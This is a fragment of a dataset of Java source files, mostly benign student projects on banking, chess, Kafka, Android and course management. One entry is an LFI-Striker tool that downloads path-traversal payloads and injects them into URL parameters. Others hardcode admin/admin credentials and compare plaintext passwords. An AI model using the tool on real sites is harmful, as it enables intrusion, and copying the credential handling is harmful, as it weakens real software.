2500 : 40000;\r\n                break;\r\n            default:\r\n                System.out.println(\"Invalid blockName\");\r\n                break;\r\n        }\r\n\r\n        // Calculate total amount\r\n        if (roomType.equals(\"AC\")) {\r\n            return collegeFee + hostelFee + 2500; // AC roomType has additional 2500\r\n        } else {\r\n            return collegeFee + hostelFee;\r\n        }\r\n    }\r\n}\r\n",
    "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class Database {\n    private List<Iris> trainingData;\n    private List<Iris> testingData;\n    private List<Iris> userData;\n    private List<Iris> inputData;\n\n    public Database() {\n        this.trainingData = new ArrayList<>();\n        this.testingData = new ArrayList<>();\n        this.userData = new ArrayList<>();\n        this.inputData = new ArrayList<>();\n    }\n\n    private void loadData(String filename, List<Iris> data, String class1, String class2){\n        try(BufferedReader br = new BufferedReader(new FileReader(filename))){\n            String line = \"\";\n            while((line = br.readLine()) != null){\n                if(Character.isDigit(line.charAt(0))){\n                    String[] split = line.split(\",\");\n                    Double sepal_length = Double.parseDouble(split[0]);\n                    Double sepal_width = Double.parseDouble(split[1]);\n                    Double petal_length = Double.parseDouble(split[2]);\n                    Double petal_width = Double.parseDouble(split[3]);\n                    String spec = split[4];\n                    if(class1.equals(spec) || class2.equals(spec))\n                        data.add(new Iris(sepal_length, sepal_width, petal_length, petal_width, spec));\n                }\n            }\n            br.close();\n        }catch (IOException e){\n            e.printStackTrace();\n        }\n    }\n\n    public void loadMainData(String class1, String class2){\n        loadData(\"IRIS.csv\", trainingData, class1, class2);\n        loadData(\"USER.csv\", userData, class1, class2);\n        splitData(trainingData);\n    }\n    private void splitData(List<Iris> irises){\n        int dataCounter = 0;\n        for (Iris iris : irises)\n            dataCounter++;\n        dataCounter *= 0.33;\n\n        for (int i = 0; i < dataCounter; i++) {\n            int index = (int) (Math.random() * irises.size());\n            testingData.add(irises.get(index));\n            irises.remove(index);\n        }\n    }\n\n    public void loadInputData(Double sepal_length, Double sepal_width, Double petal_length, Double petal_width){\n        inputData.add(new Iris(sepal_length, sepal_width, petal_length, petal_width, null));\n    }\n\n    public List<Iris> getTrainingData() {\n        return trainingData;\n    }\n\n    public List<Iris> getTestingData() {\n        return testingData;\n    }\n\n    public List<Iris> getUserData() {\n        return userData;\n    }\n\n    public List<Iris> getInputData() {\n        return inputData;\n    }\n}\n",
    "import javax.swing.JButton;\r\nimport javax.swing.JLabel;\r\nimport javax.swing.JOptionPane;\r\nimport javax.swing.JFrame;\r\nimport javax.swing.JPanel;\r\nimport javax.swing.JScrollPane;\r\nimport javax.swing.JTextArea;\r\nimport javax.swing.border.EmptyBorder;\r\n\r\nimport java.awt.GridLayout;\r\nimport java.awt.Toolkit;\r\nimport java.awt.event.ActionEvent;\r\nimport java.awt.event.ActionListener;\r\nimport java.awt.BorderLayout;\r\nimport java.awt.FlowLayout;\r\n\r\nfinal class Ui {\r\n\r\n    // Ui components are given below :\r\n    JFrame frame;\r\n    JButton btn_transaction_history, btn_withdraw, btn_deposit, btn_transfer;\r\n    JLabel top_title;\r\n\r\n    JPanel panel_top;\r\n    JPanel panel_btn;\r\n\r\n    public Ui() {\r\n\r\n        frame = new JFrame(Values.BANK_NAME);\r\n        frame.setSize(Values.FRAME_WIDTH, Values.FRAME_HEIGHT);\r\n        frame.setLocationRelativeTo(null);\r\n        frame.setIconImage(Values.ICON.getImage());\r\n        frame.getContentPane().setBackground(Values.BG_COLOR);\r\n\r\n        this.set_panels();\r\n\r\n        this.frame.add(this.panel_top, BorderLayout.NORTH);\r\n        this.frame.add(this.panel_btn, BorderLayout.CENTER);\r\n\r\n        frame.setVisible(true);\r\n    }\r\n\r\n    private void set_panels() {\r\n\r\n        // this\r\n        this.panel_top = new JPanel(new FlowLayout(FlowLayout.CENTER));\r\n        this.panel_top.setBackground(Values.BG_COLOR);\r\n        this.panel_top.setBorder(new EmptyBorder(30, 0, 0, 0));\r\n\r\n        this.set_labels();\r\n\r\n        this.panel_top.add(this.top_title);\r\n\r\n        // now setting up panel for buttons\r\n        this.panel_btn = new JPanel(new GridLayout(2, 2, 50, 50));\r\n        this.panel_btn.setBackground(Values.BG_COLOR);\r\n        this.panel_btn.setBorder(new EmptyBorder(50, 50, 50, 50));\r\n\r\n        this.set_buttons();\r\n\r\n        this.panel_btn.add(this.btn_transaction_history);\r\n        this.panel_btn.add(this.btn_transfer);\r\n        this.panel_btn.add(this.btn_deposit);\r\n        this.panel_btn.add(this.btn_withdraw);\r\n    }\r\n\r\n    // setting up buttons like transaction history, transfer, deposit and withdraw\r\n    private void set_buttons() {\r\n        this.btn_transaction_history = new JButton(\"History\");\r\n        this.btn_transaction_history.setFont(Values.button_font);\r\n        this.btn_transaction_history.setBackground(Values.FORE_COLOR);\r\n        this.btn_transaction_history.setForeground(Values.BTN_TEXT_COLOR);\r\n        this.btn_transaction_history.addActionListener(new ActionListener() {\r\n            @Override\r\n            public void actionPerformed(ActionEvent e) {\r\n                history_clicked();\r\n            }\r\n        });\r\n\r\n        this.btn_transfer = new JButton(\"Transfer\");\r\n        this.btn_transfer.setFont(Values.button_font);\r\n        this.btn_transfer.setBackground(Values.FORE_COLOR);\r\n        this.btn_transfer.setForeground(Values.BTN_TEXT_COLOR);\r\n        this.btn_transfer.addActionListener(new ActionListener() {\r\n            @Override\r\n            public void actionPerformed(ActionEvent e) {\r\n                transfer_clicked();\r\n            }\r\n        });\r\n\r\n        this.btn_deposit = new JButton(\"Deposit\");\r\n        this.btn_deposit.setFont(Values.button_font);\r\n        this.btn_deposit.setBackground(Values.FORE_COLOR);\r\n        this.btn_deposit.setForeground(Values.BTN_TEXT_COLOR);\r\n        this.btn_deposit.addActionListener(new ActionListener() {\r\n            @Override\r\n            public void actionPerformed(ActionEvent e) {\r\n                deposit_clicked();\r\n            }\r\n        });\r\n\r\n        this.btn_withdraw = new JButton(\"Withdraw\");\r\n        this.btn_withdraw.setFont(Values.button_font);\r\n        this.btn_withdraw.setBackground(Values.FORE_COLOR);\r\n        this.btn_withdraw.setForeground(Values.BTN_TEXT_COLOR);\r\n        this.btn_withdraw.addActionListener(new ActionListener() {\r\n            @Override\r\n            public void actionPerformed(ActionEvent e) {\r\n                withdraw_clicked();\r\n            }\r\n        });\r\n    }\r\n\r\n    // setting up top labels\r\n    private void set_labels() {\r\n        top_title = new JLabel(\"Saksham Bank\", JLabel.CENTER);\r\n        top_title.setFont(Values.top_title_font);\r\n        top_title.setForeground(Values.FORE_COLOR);\r\n    }\r\n\r\n    public void close() {\r\n        frame.dispose();\r\n    }\r\n\r\n    private void history_clicked() {\r\n        JFrame fr = new JFrame(\"Transaction History\");\r\n        fr.getContentPane().setBackground(Values.BG_COLOR);\r\n        fr.setIconImage(Values.ICON.getImage());\r\n        fr.setSize((int) Toolkit.getDefaultToolkit().getScreenSize().getWidth() / 4,\r\n                (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight() - 100);\r\n\r\n        JTextArea textArea = new JTextArea(Values._obj_.get_history());\r\n        textArea.setFont(Values.text_font);\r\n        textArea.setBackground(Values.BG_COLOR);\r\n        textArea.setForeground(Values.FORE_COLOR);\r\n\r\n        fr.add(new JScrollPane(textArea, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS,\r\n                JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS));\r\n  ",
    "package vetor;\n\npublic class vet {\n    private String nome;\n    private int pre\u00e7o;\n    public vet(String nome,int pre\u00e7o){\n        this.nome=nome;\n        this.pre\u00e7o=pre\u00e7o;\n    }\n    public void setNome(String nome){\n        this.nome=nome;\n    }\n    public void setPre\u00e7o(int pre\u00e7o){\n        this.pre\u00e7o=pre\u00e7o;\n    }\n    public String getNome() {\n        return nome;\n    }\n    public int getPre\u00e7o() {\n        return pre\u00e7o;\n    }\n}\npackage vetor2;\n\nimport vetor.vet;\n\nimport java.util.Scanner;\n\npublic class vet2 {\n    public static void main(String[] args) {\n        Scanner ler = new Scanner(System.in);\n        int n;\n        System.out.println(\"Digite o valor de N:\");\n        n = ler.nextInt();\n        ler.nextLine();\n        vet[] veti = new vet[n];\n        for (int i = 0; i < veti.length; i++) {\n            System.out.println(\"Produtos\" + (i + 1) + \":\");\n            System.out.println(\"Digite o nome do produto:\");\n            String nome = ler.nextLine();\n            System.out.println(\"Digite o pre\u00e7o do produto:\");\n            int pre\u00e7o = ler.nextInt();\n            ler.nextLine();\n            veti[i] = new vet(nome, pre\u00e7o);\n        }\n        double soma=0;\n        for (int i = 0; i < n; i++) {\n            soma+=veti[i].getPre\u00e7o();\n        }\n         double media=soma/n;\n        System.out.println(\"A media de pre\u00e7o dos produtos s\u00e3o:\" +media);\n    }\n}\n",
    "package main;\n\nimport pieces.Piece;\n\nimport java.awt.event.MouseAdapter;\nimport java.awt.event.MouseEvent;\n\npublic class Input extends MouseAdapter {\n    Board board;\n\n    public Input(Board board) {\n        this.board = board;\n    }\n\n    @Override\n    public void mousePressed(MouseEvent e) {\n        int col = e.getX() / board.tileSize;\n        int row = e.getY() / board.tileSize;\n\n        Piece pieceXY = board.getPiece(col, row);\n        if (pieceXY != null){\n            board.selectedPiece = pieceXY;\n        }\n    }\n    @Override\n    public void mouseDragged(MouseEvent e) {\n\n        if (board.selectedPiece != null) {\n            board.selectedPiece.xPos = e.getX() - board.tileSize / 2;\n            board.selectedPiece.yPos = e.getY() - board.tileSize / 2;\n\n            board.repaint();\n        }\n    }\n    @Override\n    public void mouseReleased(MouseEvent e) {\n\n        int col = e.getX() / board.tileSize;\n        int row = e.getY() / board.tileSize;\n\n        if (board.selectedPiece != null){\n            Move move = new Move(board, board.selectedPiece, col, row);\n\n            if (board.isValidMove(move)){\n                board.makeMove(move);\n            } else {\n                board.selectedPiece.xPos = board.selectedPiece.col * board.tileSize;\n                board.selectedPiece.yPos = board.selectedPiece.row * board.tileSize;\n            }\n\n        }\n\n        board.selectedPiece = null;\n        board.repaint();\n\n    }\n}\n",
    "package com.example.acp_submission_2;\n\nimport com.fasterxml.jackson.annotation.JsonProperty;\nimport com.google.gson.Gson;\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.ListTopicsResult;\nimport org.apache.kafka.clients.consumer.Consumer;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.consumer.ConsumerRecords;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.common.KafkaException;\nimport org.apache.kafka.common.errors.SaslAuthenticationException;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.web.bind.annotation.*;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.RecordMetadata;\nimport org.apache.kafka.common.serialization.StringSerializer;\nimport org.apache.kafka.common.errors.TimeoutException;\n\nimport java.util.*;\nimport java.util.concurrent.ExecutionException;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.time.Duration;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\n\n@RestController\npublic class MyController {\n    private static final Logger log = LoggerFactory.getLogger(MyController.class);\n\n    @PostMapping(\"/readTopic/{topicName}\")\n    public ResponseEntity<String> readTopicFromPost(@PathVariable String topicName, @RequestBody KafkaPropertiesDTO kafkaProperties) {\n        if (kafkaProperties.getBootstrapServers() == null ||\n                kafkaProperties.getSecurityProtocol() == null ||\n                kafkaProperties.getSaslMechanism() == null || kafkaProperties.getGroupId() ==null) {\n            return ResponseEntity.badRequest().body(\"Missing required fields in request body. We need:\\n- bootstrap.servers\\n- sasl.jaas.config\\n- security.protocol \\n- sasl.mechanism\\n- group.id\");\n        }\n        if (!Objects.equals(kafkaProperties.getSecurityProtocol(), \"SASL_SSL\")){\n            return ResponseEntity.badRequest().body(\"Wrong security.protocol! It should be: 'SASL_SSL'!\");\n        }\n        if (!Objects.equals(kafkaProperties.getSaslMechanism(), \"PLAIN\")){\n            return ResponseEntity.badRequest().body(\"Wrong sasl.mechanism! It should be: 'PLAIN'!\");\n        }\n        try {\n            Properties props = new Properties();\n            props.put(\"bootstrap.servers\", kafkaProperties.getBootstrapServers());\n            props.put(\"security.protocol\", kafkaProperties.getSecurityProtocol());\n            props.put(\"sasl.jaas.config\", kafkaProperties.getSaslJaasConfig());\n            props.put(\"sasl.mechanism\", kafkaProperties.getSaslMechanism());\n            props.put(\"group.id\", kafkaProperties.getGroupId());\n            props.put(\"auto.offset.reset\", \"latest\");\n            props.put(\"key.deserializer\", \"org.apache.kafka.common.serialization.StringDeserializer\");\n            props.put(\"value.deserializer\", \"org.apache.kafka.common.serialization.StringDeserializer\");\n            try (AdminClient adminClient = AdminClient.create(props)) {\n                ListTopicsResult listTopics = adminClient.listTopics();\n                Set<String> topics = listTopics.names().get(); // \u8fd9\u4e2a\u64cd\u4f5c\u662f\u963b\u585e\u7684\n\n                if (!topics.contains(topicName)) {\n                    log.info(\"Topic does not exist: \" + topicName);\n                    return ResponseEntity.badRequest().body(\"Topic does not exist: \" + topicName);\n                }\n            } catch (InterruptedException | ExecutionException e) {\n                if (e.getCause() instanceof org.apache.kafka.common.errors.SaslAuthenticationException) {\n                    return ResponseEntity.badRequest().body(\"Authentication failed. Please check your credentials.\");\n                }\n                Thread.currentThread().interrupt();\n                log.error(\"Failed to check if topic exists\", e);\n                return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(\"Failed to check if topic exists: \" + e.getMessage());\n            }\n            KafkaConsumer<String, String> consumer = new KafkaConsumer<>(props);\n            consumer.subscribe(Collections.singletonList(topicName));\n\n            StringBuilder builder = new StringBuilder();\n            ConsumerRecords<String, String> records = consumer.poll(Duration.ofSeconds(10));\n\n            for (ConsumerRecord<String, String> record : records) {\n                builder.append(String.format(\"[%s] Key: %s, Value: %s, partition: %s,offset: %s,timestamp: %s%n\",\n                        record.topic(), record.key(), record.value(),\n                        record.partition(), record.offset(), record.timestamp()));\n            }\n            consumer.close();\n            return ResponseEntity.ok(builder.toString());\n        } catch (Exceptio",
    "package org.Mouath;\n\nimport org.apache.commons.cli.*;\nimport org.jsoup.Jsoup;\nimport org.jsoup.nodes.Document;\n\nimport java.io.*;\nimport java.net.MalformedURLException;\nimport java.net.URISyntaxException;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\npublic class Main {\n\n    public static void main(String[] args) {\n        resetConsoleColor();\n        System.out.println(\"\\u001B[32m\" + \"  _       _____   ___           ____    _            _   _\\n\" +\n                \" | |     |  ___| |_ _|         / ___|  | |_   _ __  (_) | | __   ___\\n\" +\n                \" | |     | |_     | |   _____  \\\\___ \\\\  | __| | '__| | | | |/ /  / _ \\\\\\n\" +\n                \" | |___  |  _|    | |  |_____|  ___) | | |_  | |    | | |   <  |  __/\\n\" +\n                \" |_____| |_|     |___|         |____/   \\\\__| |_|    |_| |_|\\\\_\\\\  \\\\___|\\n\" +\n                \"\\n\" +\n                \"\\n\\t\\t\\t\\t\\t\\t\\thttps://github.com/MouathA\");\n        Options options = new Options();\n        options.addOption(\"i\", \"input\", true, \"Input file path\");\n        options.addOption(\"d\", \"delay\", true, \"Delay time in milliseconds\");\n        List<String> patterns = Arrays.asList(\n                \"file=\", \"document=\", \"folder=\", \"root=\", \"path=\", \"pg=\", \"style=\", \"pdf=\", \"template=\",\n                \"php_path=\", \"doc=\", \"page=\", \"name=\", \"cat=\", \"dir=\", \"action=\", \"board=\", \"date=\",\n                \"detail=\", \"download=\", \"prefix=\", \"include=\", \"inc=\", \"locate=\", \"show=\", \"site=\", \"type=\",\n                \"view=\", \"content=\", \"layout=\", \"mod=\", \"conf=\", \"url=\"\n        );\n        CommandLineParser parser = new DefaultParser();\n        try {\n            CommandLine cmd = parser.parse(options, args);\n\n            if (cmd.hasOption(\"i\")) {\n                String filePath = cmd.getOptionValue(\"i\");\n                int delayTime = cmd.hasOption(\"d\") ? Integer.parseInt(cmd.getOptionValue(\"d\")) : 0;\n\n                String text = readTextFromFile(filePath);\n                List<String> payloads = readPayloadsFromUrl(\"https://raw.githubusercontent.com/capture0x/LFI-FINDER/main/lfi.txt\");\n\n                if (text != null && !payloads.isEmpty()) {\n                    List<String> modifiedLines = processUrls(text, patterns, payloads, delayTime);\n                    writeTextToFile(\"output.txt\", modifiedLines);\n                    System.out.println(\"\\u001B[32m[+] Parameter replacement completed. Output written to output.txt.\");\n                } else {\n                    System.err.println(\"\\u001B[31m[!] Error reading input text or payloads file.\");\n                }\n            } else {\n                System.err.println(\"\\u001B[31m[!] Input file path is required. Use -i option.\");\n                displayHelp(options);\n            }\n        } catch (ParseException e) {\n            System.err.println(\"\\u001B[31m[!] Error parsing command-line arguments: \" + e.getMessage());\n        } catch (IOException e) {\n            System.err.println(\"\\u001B[31m[!] Error processing text or payloads: \" + e.getMessage());\n        }\n        resetConsoleColor();\n    }\n\n    private static void displayHelp(Options options) {\n        HelpFormatter formatter = new HelpFormatter();\n        formatter.printHelp(\"\\u001B[36mjava -jar LFI-Striker.jar -i <input_file_path> [-d <delay_time_ms>]\", options);\n    }\n\n    private static String readTextFromFile(String filePath) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line).append(\"\\n\");\n            }\n        }\n        return sb.toString();\n    }\n\n    private static List<String> readPayloadsFromUrl(String url) throws IOException {\n        List<String> payloads = new ArrayList<>();\n        URL payloadUrl = new URL(url);\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(payloadUrl.openStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                payloads.add(line.trim());\n            }\n        }\n        return payloads;\n    }\n\n    private static void writeTextToFile(String filePath, List<String> lines) throws IOException {\n        try (PrintWriter writer = new PrintWriter(filePath)) {\n            for (String line : lines) {\n                writer.println(line);\n            }\n        }\n    }\n\n    private static List<String> processUrls(String text, List<String> patterns, List<String> payloads, int delayTime) {\n        List<String> modifiedLines = new ArrayList<>();\n        String[] lines = text.split(\"\\\\r?\\\\n\");\n        for (String line : lines) {\n            StringBuilder modifiedLine = new StringBuilder(line);\n\n            boolean lineMatchesPattern = false;\n            for (String pattern : patterns) {\n                if (line.contains(pattern)) {\n   ",
    "package com.simpleroles.simpleroles.Commands;\n\nimport com.simpleroles.simpleroles.sql.QueryManager;\nimport com.simpleroles.simpleroles.utils.ScoreboardManager;\nimport org.bukkit.command.Command;\nimport org.bukkit.command.CommandExecutor;\nimport org.bukkit.command.CommandSender;\nimport org.bukkit.entity.Player;\n\npublic class RoleRemove implements CommandExecutor {\n\n    @Override\n    public boolean onCommand(CommandSender sender, Command command, String s, String[] args) {\n        if (sender instanceof Player) {\n            Player player = (Player) sender;\n\n            if (args.length == 0) {\n                player.sendMessage(\"Usage: /roleremove <player> here\");\n\n                return true;\n            } else if (args.length > 1) {\n                player.sendMessage(\"Player name cannot contain spaces.\");\n\n                return true;\n            }\n\n            Player target = player.getServer().getPlayer(args[0]);\n\n            if (target == null) {\n                player.sendMessage(\"Player \" + args[0] + \" not found.\");\n\n                return true;\n            }\n\n            QueryManager.clearRole(player, target);\n            ScoreboardManager.updateScoreboard(target, \"Default\", \"f\");\n        }\n\n        return true;\n    }\n}\n",
    "package com.example.gourmetcompass.ui.dashboard;\n\nimport android.os.Bundle;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\nimport android.widget.TextView;\n\nimport androidx.annotation.NonNull;\nimport androidx.fragment.app.Fragment;\nimport androidx.lifecycle.ViewModelProvider;\n\nimport com.example.gourmetcompass.databinding.FragmentDashboardBinding;\n\npublic class DashboardFragment extends Fragment {\n\n    private FragmentDashboardBinding binding;\n\n    public View onCreateView(@NonNull LayoutInflater inflater,\n                             ViewGroup container, Bundle savedInstanceState) {\n        DashboardViewModel dashboardViewModel =\n                new ViewModelProvider(this).get(DashboardViewModel.class);\n\n        binding = FragmentDashboardBinding.inflate(inflater, container, false);\n        View root = binding.getRoot();\n\n        final TextView textView = binding.textDashboard;\n        dashboardViewModel.getText().observe(getViewLifecycleOwner(), textView::setText);\n        return root;\n    }\n\n    @Override\n    public void onDestroyView() {\n        super.onDestroyView();\n        binding = null;\n    }\n}",
    "package coe528.project;\r\n\r\nimport java.io.File;\r\nimport java.io.FileWriter;\r\nimport java.io.IOException;\r\nimport java.util.ArrayList;\r\n//Krunal Patel 501175325\r\n//Manages bank manager operations such as initializing manager accounts, adding customers, and deleting customers.\r\npublic class ModernBankManager {\r\n\r\n    public String managerUsername = \"admin\";\r\n    public String managerPassword = \"admin\";\r\n    public String managerRole = \"manager\";\r\n\r\n    //Adds a customer if the username does not already exist\r\n    public void initializeManagerAccount() {\r\n        try {\r\n            File managerFile = new File(managerUsername + \".txt\");\r\n            if (!managerFile.exists()) {\r\n                try (FileWriter writer = new FileWriter(managerFile)) {\r\n                    writer.write(managerUsername + \"\\n\" + managerPassword + \"\\n\" + managerRole);\r\n                }\r\n            }\r\n        } catch (IOException e) {\r\n            System.err.println(\"Error initializing manager account: \" + e.getMessage());\r\n        } \r\n    }\r\n    \r\n    public ModernCustomer addCustomer(String username, String password, double initialBalance){\r\n        //Check for \"admin\" username or password first\r\n        if (username.equals(\"admin\")) {\r\n            NotificationWindow.show(\"Error\", \"Username cannot be 'admin'\"); \r\n            return null;\r\n        } else if (password.equals(\"admin\")) {\r\n            NotificationWindow.show(\"Error\", \"Password cannot be 'admin'\"); \r\n            return null;\r\n        }\r\n        //Then, check if the username already exists by looking for an existing file\r\n        File customerFile = new File(username + \".txt\"); \r\n        if (customerFile.exists()) {\r\n            NotificationWindow.show(\"Error\", \"Customer with username \\\"\" + username + \"\\\" already exists.\");\r\n            return null;\r\n        }\r\n        //Lastly, check the initial balance condition\r\n        if (initialBalance < 100) {\r\n            NotificationWindow.show(\"Error\", \"Initial Balance cannot be less than $100\"); \r\n            return null;\r\n        }\r\n        //If all checks pass, create and return a new customer\r\n        return new ModernCustomer(username, password, initialBalance, \"customer\");\r\n    }\r\n    \r\n    //Deletes a customer\r\n    public ArrayList<ModernCustomer> deleteCustomer(String customerToDelete, ArrayList<ModernCustomer> customersList) {\r\n        ModernCustomer selectedCustomer = customersList.stream()\r\n            .filter(customer -> customer.getUsername().equals(customerToDelete))\r\n            .findFirst()\r\n            .orElse(null);\r\n        if (selectedCustomer != null){\r\n            File customerFile = new File(selectedCustomer.getUsername() + \".txt\");\r\n            if (customerFile.delete()) { //Attempt to delete the file\r\n                NotificationWindow.show(\"Success\", \"Customer Deleted\"); //Display a success notification if deletion is successful\r\n                customersList.remove(selectedCustomer); \r\n                return customersList;\r\n            }\r\n        }\r\n        NotificationWindow.show(\"Error\", \"Customer not found.\");\r\n        return customersList;\r\n    }\r\n    \r\n}",
    "public class Course {\n\n    private String prefix;\n    private int number;\n    private String name;\n    private String[] days;\n    private String startTime;\n    private String endTime;\n    private int creditHours;\n    private Student[] enrollment;\n    private Semester semester;\n\n    public Course(String prefix, int number, String name, String[] days, String startTime,\n        String endTime, int creditHours, Semester semester) {\n\n        this.prefix = prefix;\n        this.number = number;\n        this.name = name;\n        this.days = days;\n        this.startTime = startTime;\n        this.endTime = endTime;\n        this.creditHours = creditHours;\n        this.enrollment = enrollment;\n        this.semester = semester;\n    }\n\n    \n    public void editCourse( String name, String[] days, String startTime,\n        String endTime, int creditHours, Semester semester) {\n\n        this.name = name;\n        this.days = days;\n        this.startTime = startTime;\n        this.endTime = endTime;\n        this.creditHours = creditHours;\n        this.semester = semester;\n    }\n    \n    public String getPrefix(){\n        return this.prefix;\n    }\n    public int getNumber(){\n        return this.number;\n    }\n    public String getName(){\n        return this.name;\n    }\n    public String[] getDays(){\n        return this.days;\n    }\n    public String getStartTime(){\n        return this.startTime;\n    }\n    public String getEndTime(){\n        return this.endTime;\n    }\n    public int getCreditHours(){\n        return this.creditHours;\n    }\n    public Student[] getEnrollment(){\n        return this.enrollment;\n    }\n    public Semester getSemester(){\n        return this.semester;\n    }\n    \n    public void addStudent(Student stu) {\n        for (int i = 0; i < enrollment.length; i++) {\n            if (enrollment[i] == null) {\n                enrollment[i] = stu;\n                return;\n            }\n        }\n        System.out.println(\"No available seats.\");\n    }\n\n    public void removeStudent(Student stu) {\n        for (int i = 0; i < enrollment.length; i++) {\n            if (enrollment[i].equals(stu)) {\n                enrollment[i] = null;\n                return;\n            }\n        }\n        System.out.println(\"No student found.\");\n    }\n    \n   public String printStudents(Semester sem) {\n        if (this.semester.equals(sem)) {\n            String str = \"\";\n            if (enrollment != null) {\n                for (Student stu : enrollment) {\n                    if (stu != null) {\n                        str += stu.getFullName() + \"\\n\";\n                    }\n                    return str;\n                }\n            }\n        } else {\n            return \"\";\n        }\n        return \"\";\n   }\n\n   public boolean equals(Course course) {\n        return this.prefix.equals(course.getPrefix()) && this.number == course.getNumber();\n   }\n\n}",
    "package com.example.ethicodebackend;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\n\n@Service\npublic class LoginService {\n\n    @Autowired\n    private LoginRepository loginRepository;\n\n    public Login findLoginByCredentials(Login login) {\n        // Use the username to find the Login object from the database\n        Login foundLogin = loginRepository.findById(login.getUsername()).orElse(null);\n\n        // Check if a user was found and if the passwords match\n        if (foundLogin != null && foundLogin.getPassword().equals(login.getPassword())) {\n            return foundLogin;  // Return the found login if credentials are correct\n        }\n\n        return null;  // Return null if no user was found or if the password does not match\n    }\n\n\n    public Login saveLogin(Login login) {\n        return loginRepository.save(login);\n    }\n\n    public Login updatePassword(String username, String newPassword) {\n        Login login = loginRepository.findById(username).orElse(null);\n        if (login != null) {\n            login.setPassword(newPassword);\n            loginRepository.save(login);\n        }\n        return login;\n    }\n}\n",
    "package edu.wisc.cs.sdn.vnet;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\nimport net.floodlightcontroller.packet.Ethernet;\n\nimport edu.wisc.cs.sdn.vnet.vns.VNSComm;\n\n/**\n * @author Aaron Gember-Jacobson\n */\npublic abstract class Device \n{\n\t/** Hostname for the device */\n\tprivate String host;\n\t\n\t/** List of the device's interfaces; maps interface name's to interfaces */\n\tprotected Map<String,Iface> interfaces;\n\t\n\t/** PCAP dump file for logging all packets sent/received by the device;\n\t *  null if packets should not be logged */\n\tprivate DumpFile logfile;\n\t\n\t/** Virtual Network Simulator communication manager for the device */\n\tprivate VNSComm vnsComm;\n\t\n\t/**\n\t * Creates a device.\n\t * @param host hostname for the device\n\t * @param logfile PCAP dump file for logging all packets sent/received by the device\n\t */\n\tpublic Device(String host, DumpFile logfile)\n\t{\n\t\tthis.host = host;\n\t\tthis.logfile = logfile;\n\t\tthis.interfaces = new HashMap<String,Iface>();\n\t\tthis.vnsComm = null;\n\t}\n\t\n\t/**\n\t * @param logfile PCAP dump file for logging all packets sent/received by \n\t * \t\t  the router; null if packets should not be logged\n\t */\n\tpublic void setLogFile(DumpFile logfile)\n\t{ this.logfile = logfile; }\n\t\n\t/**\n\t * @return PCAP dump file for logging all packets sent/received by the\n\t *         device; null if packets should not be logged\n\t */\n\tpublic DumpFile getLogFile()\n\t{ return this.logfile; }\n\t\n\t/**\n\t * @return hostname for the device\n\t */\n\tpublic String getHost()\n\t{ return this.host; }\n\t\n\t/**\n\t * @return list of the router's interfaces; maps interface name's to\n\t * \t       interfaces\n\t */\n\tpublic Map<String,Iface> getInterfaces()\n\t{ return this.interfaces; }\n\t\n\t/**\n\t * @param vnsComm Virtual Network System communication manager for the router\n\t */\n\tpublic void setVNSComm(VNSComm vnsComm)\n\t{ this.vnsComm = vnsComm; }\n\t\n\t/**\n\t * Close the PCAP dump file for the router, if logging is enabled.\n\t */\n\tpublic void destroy()\n\t{\n\t\tif (logfile != null)\n\t\t{ this.logfile.close(); }\n\t}\n\t\n\t/**\n\t * Add an interface to the device.\n\t * @param ifaceName the name of the interface\n\t */\n\tpublic Iface addInterface(String ifaceName)\n\t{\n\t\tIface iface = new Iface(ifaceName);\n\t\tthis.interfaces.put(ifaceName, iface);\n\t\treturn iface;\n\t}\n\t\n\t/**\n\t * Gets an interface on the device by the interface's name.\n\t * @param ifaceName name of the desired interface\n\t * @return requested interface; null if no interface with the given name \n\t * \t\t   exists\n\t */\n\tpublic Iface getInterface(String ifaceName)\n\t{ return this.interfaces.get(ifaceName); }\n\t\n\t/**\n\t * Send an Ethernet packet out a specific interface.\n\t * @param etherPacket an Ethernet packet with all fields, encapsulated\n\t * \t\t  headers, and payloads completed\n\t * @param iface interface on which to send the packet\n\t * @return true if the packet was sent successfully, otherwise false\n\t */\n\tpublic boolean sendPacket(Ethernet etherPacket, Iface iface)\n\t{ return this.vnsComm.sendPacket(etherPacket, iface.getName()); }\n\t\n\tpublic abstract void handlePacket(Ethernet etherPacket, Iface inIface);\n}\n",
